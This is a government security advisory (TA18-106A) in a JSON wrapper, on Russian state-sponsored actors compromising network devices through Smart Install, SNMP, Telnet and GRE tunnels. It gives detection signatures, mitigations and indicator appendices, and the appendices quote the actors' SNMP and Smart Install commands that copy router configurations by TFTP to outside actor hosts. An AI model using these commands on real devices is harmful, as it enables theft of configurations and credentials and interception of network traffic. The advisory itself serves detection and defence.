{
	"objects": [
		{
			"type": "report",
			"title": "TA18-106A: Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices",
			"name": "TA18-106A: Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices",
			"id": "report--019e46d9-69d4-4556-b1ca-6d51d61c66df",
			"description": "Original release date: April 16, 2018 | Last revised: April 20, 2018<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <ul><li>Generic Routing Encapsulation (GRE) Enabled Devices</li><li>Cisco Smart Install (SMI) Enabled Devices</li><li>Simple Network Management Protocol (SNMP) Enabled Network Devices</li></ul>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p><strong>Update: </strong>On April 19, 2018, an industry partner notified NCCIC and the FBI of malicious cyber activity that aligns with the techniques, tactics, and procedures (TTPs) and network indicators listed in this Alert. Specifically, the industry partner reported the actors redirected DNS queries to their own infrastructure by creating GRE tunnels and obtained sensitive information, which include the configuration files of networked devices.</p><p>NCCIC encourages organizations to use the detection and prevention guidelines outlined in this Alert to help defend against this activity. For instance, administrators should inspect the presence of protocol 47 traffic flowing to or from unexpected addresses, or unexplained presence of GRE tunnel creation, modification, or destruction in log files.</p><p><strong>Original Post: </strong>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS), the Federal Bureau of Investigation (FBI), and the United Kingdom’s National Cyber Security Centre (NCSC). This TA provides information on the worldwide cyber exploitation of network infrastructure devices (e.g., router, switch, firewall, Network-based Intrusion Detection System (NIDS) devices) by Russian state-sponsored cyber actors. Targets are primarily government and private-sector organizations, critical infrastructure providers, and the Internet service providers (ISPs) supporting these sectors. This report contains technical details on the tactics, techniques, and procedures (TTPs) used by Russian state-sponsored cyber actors to compromise victims. Victims were identified through a coordinated series of actions between U.S. and international partners. This report builds on previous DHS reporting and advisories from the United Kingdom, Australia, and the European Union. [1-5] This report contains indicators of compromise (IOCs) and contextual information regarding observed behaviors on the networks of compromised victims. FBI has high confidence that Russian state-sponsored cyber actors are using compromised routers to conduct man-in-the-middle attacks to support espionage, extract intellectual property, maintain persistent access to victim networks, and potentially lay a foundation for future offensive operations.</p><p>DHS, FBI, and NCSC urge readers to act on past alerts and advisories issued by the U.S. and U.K. Governments, allied governments, network device manufacturers, and private-sector security organizations. Elements from these alerts and advisories have been selected and disseminated in a wide variety of security news outlets and social media platforms. The current state of U.S. network devices—coupled with a Russian government campaign to exploit these devices—threatens the safety, security, and economic well-being of the United States.</p><p>The purpose of this TA is to inform network device vendors, ISPs, public-sector organizations, private-sector corporations, and small office home office (SOHO) customers about the Russian government campaign, provide information to identify malicious activity, and reduce exposure to this activity.</p><p>For a downloadable copy of the IOC package, see <a href=\"https://www.us-cert.gov/sites/default/files/publications/TA18-106A_TLP_WHITE.stix.xml\">TA18-106A_TLP_WHITE.stix.xml</a>.</p>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>Since 2015, the U.S. Government received information from multiple sources—including private and public sector cybersecurity research organizations and allies—that cyber actors are exploiting large numbers of enterprise-class and SOHO/residential routers and switches worldwide. The U.S. Government assesses that cyber actors supported by the Russian government carried out this worldwide campaign. These operations enable espionage and intellectual property theft that supports the Russian Federation’s national security and economic goals.</p><p><strong>Legacy Protocols and Poor Security Practice</strong></p><p>Russian cyber actors leverage a number of legacy or weak protocols and service ports associated with network administration activities. Cyber actors use these weaknesses to</p><ul><li>identify vulnerable devices;</li><li>extract device configurations;</li><li>map internal network architectures;</li><li>harvest login credentials;</li><li>masquerade as privileged users;</li><li>modify<ul><li>device firmware,</li><li>operating systems,</li><li>configurations; and</li></ul></li><li>copy or redirect victim traffic through Russian cyber-actor-controlled infrastructure.</li></ul><p>Additionally, Russian cyber actors could potentially modify or deny traffic traversing through the router.</p><p>Russian cyber actors do not need to leverage zero-day vulnerabilities or install malware to exploit these devices. Instead, cyber actors take advantage of the following vulnerabilities:</p><ul><li>devices with legacy unencrypted protocols or unauthenticated services,</li><li>devices insufficiently hardened before installation, and</li><li>devices no longer supported with security patches by manufacturers or vendors (end-of-life devices).</li></ul><p>These factors allow for both intermittent and persistent access to both intellectual property and U.S. critical infrastructure that supports the health and safety of the U.S. population.</p><p><strong>Own the Router, Own the Traffic</strong></p><p>Network devices are ideal targets. Most or all organizational and customer traffic must traverse these critical devices. A malicious actor with presence on an organization’s gateway router has the ability to monitor, modify, and deny traffic to and from the organization. A malicious actor with presence on an organization’s internal routing and switching infrastructure can monitor, modify, and deny traffic to and from key hosts inside the network and leverage trust relationships to conduct lateral movement to other hosts. Organizations that use legacy, unencrypted protocols to manage hosts and services, make successful credential harvesting easy for these actors. An actor controlling a router between Industrial Control Systems – Supervisory Control and Data Acquisition (ICS-SCADA) sensors and controllers in a critical infrastructure—such as the Energy Sector—can manipulate the messages, creating dangerous configurations that could lead to loss of service or physical destruction. Whoever controls the routing infrastructure of a network essentially controls the data flowing through the network.</p><p><strong>Network Devices—Often Easy Targets</strong></p><ul><li>Network devices are often easy targets. Once installed, many network devices are not maintained at the same security level as other general-purpose desktops and servers. The following factors can also contribute to the vulnerability of network devices:</li><li>Few network devices—especially SOHO and residential-class routers—run antivirus, integrity-maintenance, and other security tools that help protect general purpose hosts.</li><li>Manufacturers build and distribute these network devices with exploitable services, which are enabled for ease of installation, operation, and maintenance.</li><li>Owners and operators of network devices do not change vendor default settings, harden them for operations, or perform regular patching.</li><li>ISPs do not replace equipment on a customer’s property when that equipment is no longer supported by the manufacturer or vendor.</li><li>Owners and operators often overlook network devices when they investigate, examine for intruders, and restore general-purpose hosts after cyber intrusions.</li></ul>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p><strong>Stage 1: Reconnaissance</strong></p><p>Russian state-sponsored cyber actors have conducted both broad-scale and targeted scanning of Internet address spaces. Such scanning allows these actors to identify enabled Internet-facing ports and services, conduct device fingerprinting, and discover vulnerable network infrastructure devices. Protocols targeted in this scanning include</p><ul><li>Telnet (typically Transmission Control Protocol (TCP) port 23, but traffic can be directed to a wide range of TCP ports such as 80, 8080, etc.),</li><li>Hypertext Transport Protocol (HTTP, port 80),</li><li>Simple Network Management Protocol (SNMP, ports 161/162), and</li><li>Cisco Smart Install (SMI port 4786).</li></ul><p>Login banners and other data collected from enabled services can reveal the make and model of the device and information about the organization for future engagement.</p><p>Device configuration files extracted in previous operations can enhance the reconnaissance effort and allow these actors to refine their methodology.</p><p><strong>Stage 2: Weaponization and Stage 3: Delivery</strong></p><p>Commercial and government security organizations have identified specially crafted SNMP and SMI packets that trigger the scanned device to send its configuration file to a cyber-actor-controlled host via Trivial File Transfer Protocol (TFTP), User Datagram Protocol (UDP) port 69. [6-8] If the targeted network is blocking external SNMP at the network boundary, cyber actors spoof the source address of the SNMP UDP datagram as coming from inside the targeted network. The design of SMI (directors and clients) requires the director and clients to be on the same network. However, since SMI is an unauthenticated protocol, the source address for SMI is also susceptible to spoofing.</p><p>The configuration file contains a significant amount of information about the scanned device, including password hash values. These values allow cyber actors to derive legitimate credentials. The configuration file also contains SNMP community strings and other network information that allows the cyber actors to build network maps and facilitate future targeted exploitation.</p><p><strong>Stage 4: Exploitation</strong></p><p>Legitimate user masquerade is the primary method by which these cyber actors exploit targeted network devices. In some cases, the actors use brute-force attacks to obtain Telnet and SSH login credentials. However, for the most part, cyber actors are able to easily obtain legitimate credentials, which they then use to access routers. Organizations that permit default or commonly used passwords, have weak password policies, or permit passwords that can be derived from credential-harvesting activities, allow cyber actors to easily guess or access legitimate user credentials. Cyber actors can also access legitimate credentials by extracting password hash values from configurations sent by owners and operators across the Internet or by SNMP and SMI scanning.</p><p>Armed with the legitimate credentials, cyber actors can authenticate into the device as a privileged user via remote management services such as Telnet, SSH, or the web management interface.</p><p><strong>Stage 5: Installation</strong></p><p>SMI is an unauthenticated management protocol developed by Cisco. This protocol supports a feature that allows network administrators to download or overwrite any file on any Cisco router or switch that supports this feature. This feature is designed to enable network administrators to remotely install and configure new devices and install new OS files.</p><p>On November 18, 2016, a Smart Install Exploitation Tool (SIET) was posted to the Internet. The SIET takes advantage of the unauthenticated SMI design. Commercial and government security organizations have noted that Russian state-sponsored cyber actors have leveraged the SIET to abuse SMI to download current configuration files. Of concern, any actor may leverage this capability to overwrite files to modify the device configurations, or upload maliciously modified OS or firmware to enable persistence. Additionally, these network devices have writeable file structures where malware for other platforms may be stored to support lateral movement throughout the targeted network.</p><p><strong>Stage 6: Command and Control</strong></p><p>Cyber actors masquerade as legitimate users to log into a device or establish a connection via a previously uploaded OS image with a backdoor. Once successfully logged into the device, cyber actors execute privileged commands. These cyber actors create a man-in-the-middle scenario that allows them to</p><ul><li>extract additional configuration information,</li><li>export the OS image file to an externally located cyber actor-controlled FTP server,</li><li>modify device configurations,</li><li>create Generic Routing Encapsulation (GRE) tunnels, or</li><li>mirror or redirect network traffic through other network infrastructure they control.</li></ul><p>At this stage, cyber actors are not restricted from modifying or denying traffic to and from the victim. Although there are no reports of this activity, it is technically possible.</p>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <p><strong>Telnet</strong></p><p>Review network device logs and netflow data for indications of TCP Telnet-protocol traffic directed at port 23 on all network device hosts. Although Telnet may be directed at other ports (e.g., port 80, HTTP), port 23 is the primary target. Inspect any indication of Telnet sessions (or attempts). Because Telnet is an unencrypted protocol, session traffic will reveal command line interface (CLI) command sequences appropriate for the make and model of the device. CLI strings may reveal login procedures, presentation of user credentials, commands to display boot or running configuration, copying files and creation or destruction of GRE tunnels, etc. See Appendices A and B for CLI strings for Cisco and other vendors’ devices.</p><p><strong>SNMP and TFTP </strong></p><p>Review network device logs and netflow data for indications of UDP SNMP traffic directed at port 161/162 on all network-device hosts. Because SNMP is a management tool, any such traffic that is not from a trusted management host on an internal network should be investigated. Review the source address of SNMP traffic for indications of addresses that spoof the address space of the network. Review outbound network traffic from the network device for evidence of Internet-destined UDP TFTP traffic. Any correlation of inbound or spoofed SNMP closely followed by outbound TFTP should be cause for alarm and further inspection. See Appendix C for detection of the cyber actors’ SNMP tactics.</p><p>Because TFTP is an unencrypted protocol, session traffic will reveal strings associated with configuration data appropriate for the make and model of the device. See Appendices A and B for CLI strings for Cisco and other vendor’s devices.</p><p><strong>SMI and TFTP</strong></p><p>Review network device logs and netflow data for indications of TCP SMI protocol traffic directed at port 4786 of all network-device hosts. Because SMI is a management feature, any traffic that is not from a trusted management host on an internal network should be investigated. Review outbound network traffic from the network device for evidence of Internet-destined UDP TFTP traffic. Any correlation of inbound SMI closely followed by outbound TFTP should be cause for alarm and further inspection. Of note, between June 29 and July 6, 2017, Russian actors used the SMI protocol to scan for vulnerable network devices. Two Russian cyber actors controlled hosts 91.207.57.69(3) and 176.223.111.160(4), and connected to IPs on several network ranges on port 4786. See Appendix D for detection of the cyber actors’ SMI tactics.</p><p>Because TFTP is an unencrypted protocol, session traffic will reveal strings appropriate for the make and model of the device. See Appendices A and B for CLI strings for Cisco and other vendors’ devices.</p><p><strong>Determine if SMI is present</strong></p><ul><li>Examine the output of “show vstack config | inc Role”. The presence of “Role: Client (SmartInstall enabled)” indicates that Smart Install is configured.</li><li>Examine the output of \"show tcp brief all\" and look for \"*:4786\". The SMI feature listens on tcp/4786.</li><li>Note: The commands above will indicate whether the feature is enabled on the device but not whether a device has been compromised.</li></ul><p><strong>Detect use of SMI</strong></p><p>The following signature may be used to detect SMI usage. Flag as suspicious and investigate SMI traffic arriving from outside the network boundary. If SMI is not used inside the network, any SMI traffic arriving on an internal interface should be flagged as suspicious and investigated for the existence of an unauthorized SMI director. If SMI is used inside the network, ensure that the traffic is coming from an authorized SMI director, and not from a bogus director.</p><ul><li>alert tcp any any -&gt; any 4786 (msg:\"Smart Install Protocol\"; flow:established,only_stream; content:\"|00 00 00 01 00 00 00 01|\"; offset:0; depth:8; fast_pattern;)</li><li>See Cisco recommendations for detecting and mitigating SMI. [<a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi\">9]</a></li></ul><p><strong>Detect use of SIET</strong></p><p>The following signatures detect usage of the SIET's commands change_config, get_config, update_ios, and execute. These signatures are valid based on the SIET tool available as of early September 2017:</p><ul><li>alert tcp any any -&gt; any 4786 (msg:\"SmartInstallExploitationTool_UpdateIos_And_Execute\"; flow:established; content:\"|00 00 00 01 00 00 00 01 00 00 00 02 00 00 01 c4|\"; offset:0; depth:16; fast_pattern; content:\"://\";)</li><li>alert tcp any any -&gt; any 4786 (msg:\"SmartInstallExploitationTool_ChangeConfig\"; flow:established; content:\"|00 00 00 01 00 00 00 01 00 00 00 03 00 00 01 28|\"; offset:0; depth:16; fast_pattern; content:\"://\";)</li><li>alert tcp any any -&gt; any 4786 (msg: \"SmartInstallExploitationTool_GetConfig\"; flow: established; content:\"|00 00 00 01 00 00 00 01 00 00 00 08 00 00 04 08|\"; offset:0; depth:16; fast_pattern; content:\"copy|20|\";)</li></ul><p>In general, exploitation attempts with the SIET tool will likely arrive from outside the network boundary. However, before attempting to tune or limit the range of these signatures, i.e. with $EXTERNAL_NET or $HOME_NET, it is recommended that they be deployed with the source and destination address ranges set to “any”. This will allow the possibility of detection of an attack from an unanticipated source, and may allow for coverage of devices outside of the normal scope of what may be defined as the $HOME_NET.</p><p><strong>GRE Tunneling</strong></p><p>Inspect the presence of protocol 47 traffic flowing to or from unexpected addresses, or unexplained presence of GRE tunnel creation, modification, or destruction in log files.</p><p><strong>Mitigation Strategies</strong></p><p>There is a significant amount of publically available cybersecurity guidance and best practices from DHS, allied government, vendors, and the private-sector cybersecurity community on mitigation strategies for the exploitation vectors described above. The following are additional mitigations for network device manufacturers, ISPs, and owners or operators.</p><p><strong>General Mitigations</strong></p><p><u>All</u></p><ul><li>Do not allow unencrypted (i.e., plaintext) management protocols (e.g. Telnet) to enter an organization from the Internet. When encrypted protocols such as SSH, HTTPS, or TLS are not possible, management activities from outside the organization should be done through an encrypted Virtual Private Network (VPN) where both ends are mutually authenticated.</li><li>Do not allow Internet access to the management interface of any network device. The best practice is to block Internet-sourced access to the device management interface and restrict device management to an internal trusted and whitelisted host or LAN. If access to the management interface cannot be restricted to an internal trusted network, restrict remote management access via encrypted VPN capability where both ends are mutually authenticated. Whitelist the network or host from which the VPN connection is allowed, and deny all others.</li><li>Disable legacy unencrypted protocols such as Telnet and SNMPv1 or v2c. Where possible, use modern encrypted protocols such as SSH and SNMPv3. Harden the encrypted protocols based on current best security practice. DHS strongly advises owners and operators to retire and replace legacy devices that cannot be configured to use SNMP V3.</li><li>Immediately change default passwords and enforce a strong password policy. Do not reuse the same password across multiple devices. Each device should have a unique password. Where possible, avoid legacy password-based authentication, and implement two-factor authentication based on public-private keys. See NCCIC/US-CERT TA13-175A – <a href=\"https://www.us-cert.gov/ncas/alerts/TA13-175A\">Risks of Default Passwords on the Internet</a>, last revised October 7, 2016.</li></ul><p><u>Manufacturers</u></p><ul><li>Do not design products to support legacy or unencrypted protocols. If this is not possible, deliver the products with these legacy or unencrypted protocols disabled by default, and require the customer to enable the protocols after accepting an interactive risk warning. Additionally, restrict these protocols to accept connections only from private addresses (i.e., RFC 1918).</li><li>Do not design products with unauthenticated services. If this is not possible, deliver the products with these unauthenticated services disabled by default, and require the customer to enable the services after accepting an interactive risk warning. Additionally, these unauthenticated services should be restricted to accept connections only from private address space (i.e., RFC 1918).</li><li>Design installation procedures or scripts so that the customer is required to change all default passwords. Encourage the use of authentication services that do not depend on passwords, such as RSA-based Public Key Infrastructure (PKI) keys.</li><li>Because YARA has become a security-industry standard way of describing rules for detecting malicious code on hosts, consider embedding YARA or a YARA-like capability to ingest and use YARA rules on routers, switches, and other network devices.</li></ul><p><u>Security Vendors</u></p><ul><li>Produce and publish YARA rules for malware discovered on network devices.</li></ul><p><u>ISPs</u></p><ul><li>Do not field equipment in the network core or to customer premises with legacy, unencrypted, or unauthenticated protocols and services. When purchasing equipment from vendors, include this requirement in purchase agreements.</li><li>Disable legacy, unencrypted, or unauthenticated protocols and services. Use modern encrypted management protocols such as SSH. Harden the encrypted protocols based on current best security practices from the vendor.</li><li>Initiate a plan to upgrade fielded equipment no longer supported by the vendor with software updates and security patches. The best practice is to field only supported equipment and replace legacy equipment prior to it falling into an unsupported state.</li><li>Apply software updates and security patches to fielded equipment. When that is not possible, notify customers about software updates and security patches and provide timely instructions on how to apply them.</li></ul><p><u>Owners or operators</u></p><ul><li>Specify in contracts that the ISP providing service will only field currently supported network equipment and will replace equipment when it falls into an unsupported state.</li><li>Specify in contracts that the ISP will regularly apply software updates and security patches to fielded network equipment or will notify and provide the customers the ability to apply them.</li><li>Block TFTP from leaving the organization destined for Internet-based hosts. Network devices should be configured to send configuration data to a secured host on a trusted segment of the internal management LAN.</li><li>Verify that the firmware and OS on each network device are from a trusted source and issued by the manufacturer. To validate the integrity of network devices, refer to the vendor’s guidance, tools, and processes. See <a href=\"https://www.cisco.com/c/en/us/about/security-center/ios-image-verification.html\">Cisco’s Security Center</a> for guidance to validate Cisco IOS firmware images.</li><li>Cisco IOS runs in a variety of network devices under other labels, such as Linksys and SOHO Internet Gateway routers or firewalls as part of an Internet package by ISPs (e.g., Comcast). The indicators in Appendix A may be applicable to your device.</li></ul><p><strong>Detailed Mitigations</strong></p><p>Refer to the vendor-specific guidance for the make and model of network device in operation.</p><p><strong>For information on mitigating SNMP vulnerabilities, see</strong></p><ul><li>NCCIC/US-CERT Alert TA17-156A –<a href=\"https://www.us-cert.gov/ncas/alerts/TA17-156A\"> Reducing the Risk of SNMP Abuse</a>, June 5, 2017, and</li><li>NCCIC/US-CERT Alert TA16-250A – <a href=\"https://www.us-cert.gov/ncas/alerts/TA16-250A\">The Increasing Threat to Network Infrastructure Devices and Recommended Mitigations</a>, September 6, 2016 Updated September 28, 2016.</li></ul><p><strong>How to Mitigate SMI Abuse</strong></p><ul><li>Configure network devices before installing onto a network exposed to the Internet. If SMI must be used during installation, disable SMI with the “no vstack” command before placing the device into operation.</li><li>Prohibit remote devices attempting to cross a network boundary over TCP port 4786 via SMI.</li><li>Prohibit outbound network traffic to external devices over UDP port 69 via TFTP.</li><li>See Cisco recommendations for detecting and mitigating SMI. <a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi\">[10]</a></li><li>Cisco IOS runs in a variety of network devices under other labels, such as Linksys and SOHO Internet Gateway routers or firewalls as part of an Internet package by ISPs (e.g., Comcast). Check with your ISP and ensure that they have disabled SMI before or at the time of installation, or obtain instructions on how to disable it.</li></ul><p><strong>How to Mitigate GRE Tunneling Abuse:</strong></p><ul><li>Verify that all routing tables configured in each border device are set to communicate with known and trusted infrastructure.</li><li>Verify that any GRE tunnels established from border routers are legitimate and are configured to terminate at trusted endpoints.</li></ul><p> </p><h2><strong>Definitions </strong></h2><p><strong>Operating System Fingerprinting </strong>is analyzing characteristics of packets sent by a target, such as packet headers or listening ports, to identify the operating system in use on the target. <a href=\"https://csrc.nist.gov/Glossary/?term=401\">[11]</a></p><p><strong>Spear phishing</strong> is an attempt by an individual or group to solicit personal information from unsuspecting users by employing social engineering techniques. Phishing emails are crafted to appear as if they were sent from a legitimate organization or known individual. These emails often attempt to entice users to click on a link that will take the user to a fraudulent website that appears legitimate. The user then may be asked to provide personal information, such as account usernames and passwords, which can further expose them to future compromises. <a href=\"https://www.us-cert.gov/report-phishing\">[12]</a></p><p>In a <strong>watering hole attack</strong>, the attacker compromises a site likely to be visited by a particular target group, rather than attacking the target group directly. <a href=\"https://www.cnss.gov/CNSS/issuances/Instructions.cfm\">[13]</a></p><p> </p><h2><strong>Report Notice</strong></h2><p>DHS encourages recipients who identify the use of tools or techniques discussed in this document to report information to NCCIC or law enforcement immediately. To request incident response resources or technical assistance, contact NCCIC at NCCICcustomerservice@hq.dhs.gov or 888-282-0870 and the FBI through a local field office or the FBI’s Cyber Division at CyWatch@fbi.gov or 855-292-3937. To request information from or report cyber incidents to UK authorities, contact NCSC at www.ncsc.gov.uk/contact.</p><p> </p><h2>Appendix A: Cisco Related Command and Configuration Strings</h2><p><strong>Command Strings.</strong></p><p>Commands associated with Cisco IOS. These strings may be seen in inbound network traffic of unencrypted management tools such as Telnet or HTTP, in the logs of application layer firewalls, or in the logs of network devices. Network device owners and operators should review the Cisco documentation of their particular makes and models for strings that would allow the owner or operator to customize the list for an Intrusion Detection System (IDS). Detecting commands from Internet-based hosts should be a cause for concern and further investigation. Detecting these strings in network traffic or log files does not confirm compromise. Further analysis is necessary to remove false positives.</p><p>Strings:</p><div style=\"background: rgb(238, 238, 238); padding: 5px 10px; border: 1px solid rgb(204, 204, 204); border-image: none;\">'sh arp'           <br />'sho arp'           <br />'show arp'<br />'sh bgp sum'       <br />'sho bgp sum'       <br />'show bgp sum'<br />'sh cdp'           <br />'sho cdp'           <br />'show cdp'<br />'sh con'           <br />'sho con'<br />'show con'<br />'sh ip route'     <br />'sho ip route'      <br />'show ip route'<br />'sh inv'           <br />'sho inv'           <br />'show inv'<br />'sh int'           <br />'sho int'           <br />'show int'<br />'sh nat trans'    <br />'sho nat trans'     <br />'show nat trans'<br />'sh run'           <br />'sho run'           <br />'show run'<br />'sh ver'           <br />'sho ver'           <br />'show ver'<br />'sh isis'          <br />'sho isis'          <br />'show isis'<br />'sh rom-monitor'   <br />'sho rom-monitor'   <br />'show rom-monitor'<br />'sh startup-config'<br />'sho startup-config'<br />'show startup-config'<br />'sh boot'          <br />'sho boot'          <br />'show boot'<br />'enable'          <br />'enable secret'</div><p><strong>Configuration Strings.</strong></p><p>Strings associated with Cisco IOS configurations may be seen in the outbound network traffic of unencrypted management tools such as Telnet, HTTP, or TFTP. This is a subset of the possible strings. Network device owners and operators should export the configuration of their particular makes and models to a secure host and examine it for strings that would allow the owner or operator to customize the list for an IDS. Detecting outbound configuration data leaving an organization destined for Internet-based hosts should be a cause for concern and further investigation to ensure the destination is authorized to receive the configuration data. Because configuration data provides an adversary with information—such as the password hashes—to enable future attacks, configuration data should be encrypted between sender and receiver. Outbound configuration files may be triggered by SNMP queries and Cisco Smart Install commands. In such cases, the outbound file would be sent via TFTP. Detecting these strings in network traffic or log files does not confirm compromise. Further analysis is necessary to remove false positives.</p><p>Strings:</p><div style=\"background: rgb(238, 238, 238); padding: 5px 10px; border: 1px solid rgb(204, 204, 204); border-image: none;\">aaa new-model<br />advertisement version<br />BGP router identifier<br />boot system flash:<br />Building configuration?<br />Cisco Internetwork Operating System<br />Cisco IOS Software,<br />Configuration register<br />www.cisco.com/techsupport<br />Codes C ? connected, S ? static<br />configuration memory<br />Current configuration :<br />boot-start-marker<br />! Last configuration change at <br />! NVRAM config last updated at <br />interface VLAN<br />interface FastEthernet<br />interface GigabitEthernet<br />interface pos<br />line protocol is<br />loopback not set<br />ip access-list extended<br />nameif outside<br />Routing Bit Set on this LSA<br />route source<br />router bgp<br />router ospf<br />routing table<br />ROM: Bootstrap program is<br />snmp-server<br />system bootstrap<br />System image file is<br />PIX VERSION<br />ASA VERSION<br />(ASA)<br />boot-start-marker<br />boot system flash<br />boot end-marker<br />BOOT path-list</div><p> </p><h2>Appendix B: Other Vendor Command and Configuration Strings</h2><p>Russian state-sponsored cyber actors could potentially target the network devices from other manufacturers. Therefore, operators and owners should review the documentation associated with the make and model they have in operation to identify strings associated with administrative functions. Export the current configuration and identify strings associated with the configuration. Place the device-specific administrative and configuration strings into network-based and host-based IDS. Examples for Juniper JUNOS may include: “enable”, ”reload”, ”show”, ”set”, ”unset” ”file copy”, or ”request system scripts” followed by other expected parameters. Examples for MicroTic may include: “ip”, ”interface”, ”firewall”, ”password”, or ”ping”. See the documentation for your make and model for specific strings and parameters to place on watch.</p><p>These strings may be seen in inbound network traffic of unencrypted management tools such as Telnet or HTTP, in the logs of application layer firewalls or network devices. Detecting commands from Internet-based hosts should be a cause for concern and further investigation. Detecting these strings in network traffic or log files does not confirm compromise. Further analysis is necessary to remove false positives.</p><p>The following are important functions to monitor:</p><ul><li>login</li><li>displaying or exporting the current configuration</li><li>copying files from the device to another host, especially a host outside the LAN or one not previously authorized</li><li>copying files to the device from another host, especially a host outside the LAN or one not previously authorized</li><li>changes to the configuration</li><li>creation or destruction of GRE tunnels</li></ul><p> </p><h2>Appendix C: SNMP Queries</h2><ul><li>SNMP query containing any of the following from an external host<ul><li>show run</li><li>show ip arp</li><li>show version</li><li>show ip route</li><li>show neighbor detail</li><li>show interface</li></ul></li><li>SNMP Command ID 1.3.6.1.4.1.9.9.96 with the TFTP server IP parameter of “80.255.3.85”</li><li>SNMP and Cisco's \"config copy\" management information base (MIB) object identifiers (OIDs) Command ID  1.3.6.1.4.1.9.9.96 with the TFTP server IP parameter of “87.120.41.3” and community strings of ”public” ”private” or ”anonymous”</li></ul><table border=\"1\" cellpadding=\"1\" cellspacing=\"1\" class=\"general-table\" style=\"width: 600px; height: 312px;\"><thead><tr><th scope=\"col\">OID Name</th><th scope=\"col\">OID Value</th><th scope=\"col\">Meaning</th></tr><tr><td scope=\"col\" style=\"text-align: left;\">1.3.6.1.4.1.9.9.96.1.1.1.1.2</td><td scope=\"col\" style=\"text-align: left;\">1</td><td scope=\"col\" style=\"text-align: left;\">Protocol type = TFTP</td></tr><tr><td scope=\"col\" style=\"text-align: left;\">1.3.6.1.4.1.9.9.96.1.1.1.1.3</td><td scope=\"col\" style=\"text-align: left;\">1</td><td scope=\"col\" style=\"text-align: left;\">Source file type = network file</td></tr><tr><td scope=\"col\" style=\"text-align: left;\">1.3.6.1.4.1.9.9.96.1.1.1.1.4</td><td scope=\"col\" style=\"text-align: left;\">4</td><td scope=\"col\" style=\"text-align: left;\">Destination file type = running config</td></tr><tr><td scope=\"col\" style=\"text-align: left;\">1.3.6.1.4.1.9.9.96.1.1.1.1.5</td><td scope=\"col\" style=\"text-align: left;\">87.120.41.3</td><td scope=\"col\" style=\"text-align: left;\">TFTP server IP = 87.120.41.3</td></tr><tr><td scope=\"col\" style=\"text-align: left;\">1.3.6.1.4.1.9.9.96.1.1.1.1.6</td><td scope=\"col\" style=\"text-align: left;\">backup</td><td scope=\"col\" style=\"text-align: left;\">File name = backup</td></tr><tr><td scope=\"col\" style=\"text-align: left;\">1.3.6.1.4.1.9.9.96.1.1.1.1.14</td><td scope=\"col\" style=\"text-align: left;\">4</td><td scope=\"col\" style=\"text-align: left;\">Activate the status of the table entry</td></tr></thead></table><ul><li>SNMP Command ID 1.3.6.1.4.1.9.9.96 with the TFTP server IP parameter 80.255.3.85</li><li>SNMP v2c and v1 set-requests with the OID 1.3.6.1.4.1.9.2.1.55 with the TFTP server IP parameter “87.120.41.3”, using community strings “private” and “anonymous”</li><li>The OID 1.3.6.1.4.1.9.2.1.55.87.120.41.3 is a request to transfer a copy of a router's configuration to the IP address specified in the last four octets of the OID, in this case 87.120.41.3.</li><li>Since late July 2016, 87.120.41.3 has been scanning thousands of IPs worldwide using SNMP.</li><li>Between November 21 and 22, 2016, Russian cyber actors attempted to scan using SNMP version 2 Object Identifier (OID) 1.3.6.1.4.9.9.96.1.1.1.1.5 with a value of 87.120.41.3 and a community string of “public”. This command would cause vulnerable devices to exfiltrate configuration data to a specified IP address over TFTP; in this case, IP address 87.120.41.3.</li><li>SNMP, TFTP, HTTP, Telnet, or SSH traffic to or from the following IPs<ul><li>210.245.123.180</li></ul></li></ul><p> </p><h2>Appendix D: SMI Queries</h2><p>Between June 29 and July 6, 2017, Russian actors used the Cisco Smart Install protocol to scan for vulnerable network devices. Two Russian cyber actor-controlled hosts, 91.207.57.69(3) and 176.223.111.160(4), connected to IPs on several network ranges on port 4786 and sent the following two commands:</p><ul><li>copy nvram:startup-config flash:/config.text</li><li>copy nvram:startup-config tftp://[actor address]/[actor filename].conf</li></ul><p>In early July 2017, the commands sent to targets changed slightly, copying the running configuration file instead of the startup configuration file. Additionally, the second command copies the file saved to flash memory instead of directly copying the configuration file.</p><ul><li>copy system:running-config flash:/config.text</li><li>copy flash:/config.text tftp://[ actor address]/[actor filename].conf</li></ul>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    \t<li><a href=\"https://cyber.dhs.gov/assets/report/ar-16-20173.pdf\">[1] The Increasing Threat to Network Infrastructure Devices and Recommended Mitigations. DHS. AR-16-20173. August 30, 2016.</a></li>\n            \t\t    \t<li><a href=\"http://cert.europa.eu/static/SecurityAdvisories/2017/CERT-EU-SA2017-003.pdf\">[2] Cisco Smart Install Protocol Issues. CERT-EU. Advisory 2017-003. February 22, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://www.ncsc.gov.uk/guidance/internet-edge-device-security\">[3] Internet Edge Device Security. United Kingdom. National Cyber Security Centre. May 12, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://www.ncsc.gov/uk/information/uk-internet-edge-router-devices-advisory\">[4] UK Internet Edge Router Devices: Advisory. United Kingdom. National Cyber Security Centre. August 11, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://www.acsc.gov.au/news/routers-targeted.html\">[5] Routers Targeted. Australian Cyber Security Centre. August 16, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi\">[6] Cisco Smart Install Protocol Misuse. Cisco. February 14, 2017. Updated October 30, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://www.acsc.gov.au/news/routers-targeted.html\">[7] Routers Targeted. Australian Cyber Security Centre. August 16, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://www.iad.gov/iad/library/ia-advisories-alerts/cisco-smart-install-protocol-misuse.cfm\">[8] Cisco Smart Install Protocol Misuse. NSA, IAD. August 7, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi\">[9] Cisco Smart Install Protocol Misuse. 